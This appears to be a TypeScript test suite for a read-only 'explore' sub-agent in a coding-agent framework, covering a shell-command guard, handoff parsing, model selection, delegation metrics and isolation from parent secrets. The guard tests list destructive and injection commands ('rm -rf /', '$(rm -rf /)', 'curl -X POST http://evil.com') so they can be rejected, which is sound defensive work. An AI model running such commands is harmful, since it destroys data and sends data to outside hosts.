/**
 * Test suite for AIES-003: Isolated Explore.
 *
 * Verifies:
 * 1. Context isolation (sentinels do not leak into child session).
 * 2. Read-only tool surface (only read, grep, find, ls, guarded bash; no edit/write).
 * 3. Bash inspection guard (rejects mutating commands, accepts inspection commands).
 * 4. Structured handoff schema compliance and fallback.
 * 5. Defensive output capping (< 6,000 characters).
 * 6. Model resolution hierarchy (AIES_EXPLORE_MODEL > aies.json > parent model).
 * 7. Metrics isolation (child reads/calls do not pollute parent metrics).
 * 8. Observability tracking for delegations (state, snapshots, footer, report).
 * 9. End-to-end child session execution via mock provider.
 */

import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";

import { fauxAssistantMessage, fauxProvider, fauxToolCall } from "@earendil-works/pi-ai";
import {
  createAgentSession,
  DefaultResourceLoader,
  ModelRuntime,
  SessionManager,
} from "@earendil-works/pi-coding-agent";

import {
  createReadOnlyBashOperations,
  isSafeInspectionCommand,
} from "../extensions/aies-agents/bash-guard.ts";
import { createDelegateTool } from "../extensions/aies-agents/delegate.ts";
import { runExploreAgent } from "../extensions/aies-agents/explore.ts";
import {
  formatExploreHandoff,
  MAX_HANDOFF_CHARS,
  parseExploreHandoff,
} from "../extensions/aies-agents/handoff.ts";
import { resolveExploreModel } from "../extensions/aies-agents/model.ts";
import {
  applyDelegationEnd,
  applyDelegationStart,
  applyToolCall,
  applyToolResult,
  createState,
  fromSnapshot,
  toSnapshot,
} from "../extensions/aies-runtime/state.ts";
import { renderFooter, renderStatusReport } from "../extensions/aies-runtime/status.ts";

const REPO_ROOT = fileURLToPath(new URL("..", import.meta.url)).replace(/\/$/, "");

describe("AIES-003 Isolated Explore", () => {
  describe("Bash guard & read-only enforcement", () => {
    it("allows safe inspection shell commands", () => {
      const safeCommands = [
        "git status",
        "git diff HEAD~1",
        "git log -n 5 --oneline",
        "git show HEAD:package.json",
        "git blame README.md",
        "git ls-files",
        "ls -la src",
        "cat package.json",
        "cat package.json | grep version",
        "find . -name '*.ts'",
        "head -n 20 README.md",
        "wc -l package.json",
        "jq .name package.json",
        "echo 2>&1",
        "VAR=foo git status",
        "cd /tmp && ls",
      ];

      for (const cmd of safeCommands) {
        assert.equal(isSafeInspectionCommand(cmd), true, `Expected safe: ${cmd}`);
      }
    });

    it("rejects mutating or dangerous shell commands", () => {
      const dangerousCommands = [
        "rm -rf /",
        "touch new_file.txt",
        "echo 'mutated' > package.json",
        "echo 'append' >> README.md",
        "git commit -m 'sneaky commit'",
        "git push origin main",
        "git checkout branch",
        "git reset --hard",
        "git clean -fd",
        "sed -i 's/a/b/g' file.txt",
        "sed --in-place 's/a/b/g' file.txt",
        "find . -name '*.ts' -delete",
        "find . -exec rm {} \\;",
        "echo $(rm -rf /)",
        "echo `touch pwned`",
        "npm install malicious-pkg",
        "node -e 'process.exit(1)'",
        "python3 -c 'import os; os.remove(\"file\")'",
        "curl -X POST http://evil.com",
      ];

      for (const cmd of dangerousCommands) {
        assert.equal(isSafeInspectionCommand(cmd), false, `Expected rejected: ${cmd}`);
      }
    });

    it("createReadOnlyBashOperations blocks dangerous execution at runtime", async () => {
      let executed = false;
      const baseOps = {
        exec: async () => {
          executed = true;
          return { exitCode: 0 };
        },
      };

      const readOnlyOps = createReadOnlyBashOperations(baseOps);

      // Safe command executes through baseOps
      const res = await readOnlyOps.exec("git status", process.cwd(), {});
      assert.equal(executed, true);
      assert.equal(res.exitCode, 0);

      // Mutating command throws before reaching baseOps
      executed = false;
      await assert.rejects(
        async () => {
          await readOnlyOps.exec("rm -rf file.txt", process.cwd(), {});
        },
        /Command blocked: Explore child agent is strictly read-only/u,
      );
      assert.equal(executed, false, "baseOps must never be called for dangerous commands");
    });
  });

  describe("Structured handoff parsing and formatting", () => {
    it("parses valid structured JSON code blocks with done, blocked, and failed statuses", () => {
      const doneJson = `Here are my findings:
\`\`\`json
{
  "status": "done",
  "summary": "Architecture verified.",
  "evidence": [
    { "file": "docs/ARCHITECTURE.md", "lines": "1-20", "note": "Defines harness layer" }
  ],
  "issues": [],
  "next": ["Proceed to implementation"]
}
\`\`\``;

      const doneHandoff = parseExploreHandoff(doneJson);
      assert.equal(doneHandoff.status, "done");
      assert.equal(doneHandoff.summary, "Architecture verified.");
      assert.equal(doneHandoff.evidence.length, 1);
      assert.equal(doneHandoff.evidence[0].file, "docs/ARCHITECTURE.md");
      assert.equal(doneHandoff.evidence[0].lines, "1-20");

      const blockedJson = `\`\`\`json
{
  "status": "blocked",
  "summary": "Cannot access external service credentials.",
  "evidence": [],
  "issues": ["Missing API token"],
  "next": ["Ask user for credentials"]
}
\`\`\``;

      const blockedHandoff = parseExploreHandoff(blockedJson);
      assert.equal(blockedHandoff.status, "blocked");
      assert.deepEqual(blockedHandoff.issues, ["Missing API token"]);

      const failedJson = `\`\`\`json
{
  "status": "failed",
  "summary": "Directory corrupted.",
  "evidence": [],
  "issues": ["Corrupted tree"],
  "next": []
}
\`\`\``;

      const failedHandoff = parseExploreHandoff(failedJson);
      assert.equal(failedHandoff.status, "failed");
    });

    it("falls back gracefully when model produces non-JSON output or empty text", () => {
      const emptyHandoff = parseExploreHandoff("");
      assert.equal(emptyHandoff.status, "failed");
      assert.equal(emptyHandoff.summary, "Explore child returned no output.");

      const freeText = "I found that the package is named aies and uses Node 22.";
      const textHandoff = parseExploreHandoff(freeText);
      assert.equal(textHandoff.status, "done");
      assert.equal(textHandoff.summary, freeText);
      assert.match(textHandoff.issues[0], /did not provide a structured JSON handoff block/u);
    });

    it("formats handoff nicely and caps output defensively under 6,000 characters", () => {
      const handoff = {
        status: "done",
        summary: "Short summary",
        evidence: [{ file: "a.ts", lines: "1-10", note: "some note" }],
        issues: ["issue 1"],
        next: ["next step 1"],
      };

      const formatted = formatExploreHandoff(handoff);
      assert.match(formatted, /^### Explore Result: DONE/u);
      assert.match(formatted, /\*\*Summary\*\*: Short summary/u);
      assert.match(formatted, /- `a\.ts` \(lines 1-10\): some note/u);
      assert.ok(formatted.length < MAX_HANDOFF_CHARS);

      // Test defensive capping on gigantic output
      const giganticHandoff = {
        status: "done",
        summary: "A".repeat(10_000),
        evidence: [],
        issues: [],
        next: [],
      };

      const capped = formatExploreHandoff(giganticHandoff);
      assert.ok(capped.length <= MAX_HANDOFF_CHARS + 100);
      assert.match(capped, /\[Truncated: explore handoff exceeded 6,000 characters\]/u);
    });
  });

  describe("Model resolution hierarchy", () => {
    it("prefers AIES_EXPLORE_MODEL environment variable", async () => {
      const faux = fauxProvider();
      const runtime = await ModelRuntime.create();
      runtime.registerNativeProvider(faux.provider);

      const parentModel = { id: "parent-model", provider: "mock" };
      const env = { AIES_EXPLORE_MODEL: "faux/faux-1" };

      const resolved = await resolveExploreModel(runtime, parentModel, "/dummy", env);
      assert.equal(resolved?.id, "faux-1");
    });

    it("reads model from aies.json when env is unset", async () => {
      const faux = fauxProvider();
      const runtime = await ModelRuntime.create();
      runtime.registerNativeProvider(faux.provider);

      const tempDir = mkdtempSync(join(tmpdir(), "aies-model-test-"));
      try {
        writeFileSync(
          join(tempDir, "aies.json"),
          JSON.stringify({ agents: { explore: { model: "faux/faux-1" } } }),
        );

        const parentModel = { id: "parent-model", provider: "mock" };
        const resolved = await resolveExploreModel(runtime, parentModel, tempDir, {});
        assert.equal(resolved?.id, "faux-1");
      } finally {
        rmSync(tempDir, { recursive: true, force: true });
      }
    });

    it("falls back to parent model when neither env nor config specifies a model", async () => {
      const parentModel = { id: "parent-model", provider: "mock" };
      const resolved = await resolveExploreModel(null, parentModel, "/dummy", {});
      assert.equal(resolved, parentModel);
    });
  });

  describe("Observability delegation metrics", () => {
    const T0 = 1_000_000;

    it("tracks delegation lifecycle in state transitions", () => {
      let state = createState(T0);
      assert.equal(state.delegations.total, 0);
      assert.equal(state.delegations.activeRole, undefined);

      // Start delegation
      state = applyDelegationStart(state, "explore", T0 + 1000);
      assert.equal(state.delegations.total, 1);
      assert.equal(state.delegations.byRole.explore, 1);
      assert.equal(state.delegations.activeRole, "explore");
      assert.equal(state.session.lastEventAt, T0 + 1000);

      // End delegation
      state = applyDelegationEnd(state, "done", T0 + 5000);
      assert.equal(state.delegations.total, 1);
      assert.equal(state.delegations.activeRole, undefined);
      assert.equal(state.delegations.lastOutcome, "done");
      assert.equal(state.session.lastEventAt, T0 + 5000);
    });

    it("round-trips delegations through snapshots", () => {
      let state = createState(T0);
      state = applyDelegationStart(state, "explore", T0 + 100);
      state = applyDelegationEnd(state, "done", T0 + 200);

      const snap = toSnapshot(state);
      assert.equal(snap.delegations.total, 1);
      assert.equal(snap.delegations.byRole.explore, 1);
      assert.equal(snap.delegations.lastOutcome, "done");

      const restored = toSnapshot(fromSnapshot(JSON.parse(JSON.stringify(snap)), T0));
      assert.deepEqual(restored.delegations, snap.delegations);
    });

    it("renders active delegation in footer and details in status report", () => {
      let state = createState(T0);
      state = applyDelegationStart(state, "explore", T0 + 100);

      const activeFooter = renderFooter(toSnapshot(state), T0 + 5000);
      assert.match(activeFooter, /delegando explore/u);

      state = applyDelegationEnd(state, "done", T0 + 6000);
      const idleFooter = renderFooter(toSnapshot(state), T0 + 7000);
      assert.ok(!idleFooter.includes("delegando"), "Footer must not mention active delegation once finished");

      const report = renderStatusReport(toSnapshot(state), T0 + 7000);
      assert.match(report, /Delegaciones:/u);
      assert.match(report, /explore\s+1/u);
      assert.match(report, /último resultado\s+done/u);
    });
  });

  describe("End-to-end child session execution and isolation", () => {
    it("guarantees child context isolation from parent secret sentinels", async () => {
      const faux = fauxProvider();
      const runtime = await ModelRuntime.create();
      runtime.registerNativeProvider(faux.provider);
      const model = faux.models[0];

      const PARENT_SECRET_SENTINEL = "SECRET_PARENT_TOKEN_XY987_DO_NOT_LEAK";

      // The child agent answers with structured JSON
      const jsonText = `\`\`\`json
{
  "status": "done",
  "summary": "Investigation completed without leaks.",
  "evidence": [],
  "issues": [],
  "next": []
}
\`\`\``;

      faux.setResponses([fauxAssistantMessage([{ type: "text", text: jsonText }])]);

      const sessionManager = SessionManager.inMemory(REPO_ROOT);

      const handoff = await runExploreAgent({
        task: "Verify that the parent sentinel is not present in child context",
        cwd: REPO_ROOT,
        agentDir: REPO_ROOT,
        modelRuntime: runtime,
        model,
        sessionManager,
      });

      assert.equal(handoff.status, "done");

      // Verify that the child session transcript contains absolutely zero trace of the parent sentinel
      const entries = sessionManager.getEntries();
      const fullChildTranscript = JSON.stringify(entries);
      assert.equal(
        fullChildTranscript.includes(PARENT_SECRET_SENTINEL),
        false,
        "Parent secret sentinel leaked into child session!",
      );
    });

    it("verifies read-only tool surface in child AgentSession", async () => {
      const faux = fauxProvider();
      const runtime = await ModelRuntime.create();
      runtime.registerNativeProvider(faux.provider);
      const model = faux.models[0];

      const resourceLoader = new DefaultResourceLoader({
        cwd: REPO_ROOT,
        agentDir: REPO_ROOT,
        noExtensions: true,
        noSkills: true,
        noPromptTemplates: true,
        noThemes: true,
        systemPrompt: "You are an explorer.",
      });
      await resourceLoader.reload();

      const { session } = await createAgentSession({
        cwd: REPO_ROOT,
        agentDir: REPO_ROOT,
        model,
        modelRuntime: runtime,
        resourceLoader,
        sessionManager: SessionManager.inMemory(REPO_ROOT),
        tools: ["read", "grep", "find", "ls", "bash"],
      });

      try {
        const activeTools = session.getActiveToolNames();
        assert.deepEqual(
          activeTools.sort(),
          ["bash", "find", "grep", "ls", "read"].sort(),
          "Child tool surface must be strictly read-only",
        );

        const allTools = session.getAllTools().map((t) => t.name);
        assert.equal(allTools.includes("edit"), false, "Child must NOT have 'edit' tool in registry");
        assert.equal(allTools.includes("write"), false, "Child must NOT have 'write' tool in registry");
      } finally {
        session.dispose();
      }
    });

    it("executes multi-turn exploration with tool calls and returns structured evidence", async () => {
      const faux = fauxProvider();
      const runtime = await ModelRuntime.create();
      runtime.registerNativeProvider(faux.provider);
      const model = faux.models[0];

      // Turn 1: Child calls "read" on package.json
      const readCall = fauxAssistantMessage([
        fauxToolCall("read", { path: "package.json" }, "call-read-pkg"),
      ]);

      // Turn 2: Child inspects and outputs structured handoff
      const handoffJson = `\`\`\`json
{
  "status": "done",
  "summary": "Verified package name and ESM module setup.",
  "evidence": [
    { "file": "package.json", "lines": "1-10", "note": "name is aies and type is module" }
  ],
  "issues": [],
  "next": ["Review extension entry points"]
}
\`\`\``;
      const finishMsg = fauxAssistantMessage([{ type: "text", text: handoffJson }]);

      faux.setResponses([readCall, finishMsg]);

      const handoff = await runExploreAgent({
        task: "Inspect package.json configuration",
        cwd: REPO_ROOT,
        agentDir: REPO_ROOT,
        modelRuntime: runtime,
        model,
      });

      assert.equal(handoff.status, "done");
      assert.equal(handoff.summary, "Verified package name and ESM module setup.");
      assert.equal(handoff.evidence.length, 1);
      assert.equal(handoff.evidence[0].file, "package.json");
    });

    it("isolates parent metrics from child tool calls", async () => {
      let parentState = createState(1_000_000);

      // Parent calls aies_delegate (1 tool call)
      parentState = applyToolCall(
        parentState,
        { toolName: "aies_delegate", input: { role: "explore", task: "Look at files" } },
        1_000_100,
        REPO_ROOT,
      );
      parentState = applyDelegationStart(parentState, "explore", 1_000_100);

      // Child runs internally (would execute 5 read calls, 2 bash commands inside child session)
      // Because child has noExtensions: true, parent state does not receive those events!

      // Parent finishes delegate tool call
      parentState = applyToolResult(
        parentState,
        { content: "### Explore Result: DONE", isError: false },
        1_000_500,
      );
      parentState = applyDelegationEnd(parentState, "done", 1_000_500);

      // Assert parent metrics only reflect the single delegation, not child internal actions
      assert.equal(parentState.tools.calls, 1, "Parent tool calls must count only the single delegate tool");
      assert.equal(parentState.tools.callsByName.aies_delegate, 1);
      assert.equal(parentState.exploration.sourceReads, 0, "Child file reads must NOT inflate parent sourceReads");
      assert.equal(parentState.exploration.shellInspections, 0, "Child bash calls must NOT inflate parent shellInspections");
      assert.equal(parentState.delegations.total, 1);
      assert.equal(parentState.delegations.lastOutcome, "done");
    });

    it("creates a valid aies_delegate ToolDefinition conforming to schema", async () => {
      const tool = createDelegateTool();
      assert.equal(tool.name, "aies_delegate");
      assert.equal(tool.label, "AIES Delegate");
      assert.ok(tool.parameters);

      // Invalid role rejected
      await assert.rejects(
        async () => {
          await tool.execute(
            "call-1",
            { role: "planner", task: "Plan things" },
            undefined,
            undefined,
            { cwd: REPO_ROOT },
          );
        },
        /Unsupported delegation role: "planner"/u,
      );
    });
  });
});
